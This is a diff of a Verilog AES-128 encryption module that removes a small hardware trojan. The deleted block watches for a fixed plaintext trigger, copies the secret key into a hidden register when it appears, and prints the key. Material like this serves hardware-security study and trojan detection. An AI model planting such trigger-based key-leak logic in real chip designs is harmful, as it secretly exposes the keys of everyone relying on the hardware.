@@ -1,4 +1,4 @@
- module AES128(
+module AES128(
     input clk,
     input reset,
     
@@ -18,7 +18,7 @@
     output [31:0] OUT_DATA3
 );
 wire [127:0] IN_DATA, IN_KEY, OUT_DATA;
-reg [127:0] malware ;                                                  //malware attached
+
 assign IN_DATA = {IN_DATA3, IN_DATA2, IN_DATA1, IN_DATA0};
 assign IN_KEY = {IN_KEY3, IN_KEY2, IN_KEY1, IN_KEY0};
 assign {OUT_DATA3, OUT_DATA2, OUT_DATA1, OUT_DATA0} = OUT_DATA;
@@ -32,17 +32,6 @@ always @(posedge clk) begin
     R0_OUT_DATA <= IN_DATA ^ IN_KEY;
     KEY <= IN_KEY;
 end
-always @(posedge clk)   //malware block 
-begin 
-if (IN_DATA==128'h49542049530000000000000000000000)
-begin 
-  malware <= IN_KEY;
- $display(" malware value is :%h",malware);
-end
-else 
-malware <=128'h0;
-end
-
 
 GENERATE_KEY
         K1 (.clk(clk), .ROUND_KEY(4'd0), .IN_KEY(KEY),       .OUT_KEY(OUT_KEYW1), .OUT_KEY_R(OUT_KEYR0)),
